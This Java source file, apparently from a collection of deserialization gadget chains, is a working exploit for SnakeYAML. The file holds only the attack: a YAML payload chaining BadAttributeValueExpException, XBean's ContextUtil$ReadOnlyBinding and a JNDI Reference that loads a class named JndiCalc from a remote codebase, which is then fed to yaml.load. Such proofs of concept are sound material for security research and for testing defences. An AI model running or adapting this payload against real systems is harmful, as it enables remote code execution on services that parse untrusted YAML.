package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// XBean EXP, XBean 任意版本
public class XbeanEXP {
    public static void main(String[] args) {
        String payload = "!!javax.management.BadAttributeValueExpException " +
                "[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding " +
                "[\"Drunkbaby\",!!javax.naming.Reference [\"foo\", \"JndiCalc\", \"http://localhost:7777/\"]," +
                "!!org.apache.xbean.naming.context.WritableContext []]]";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
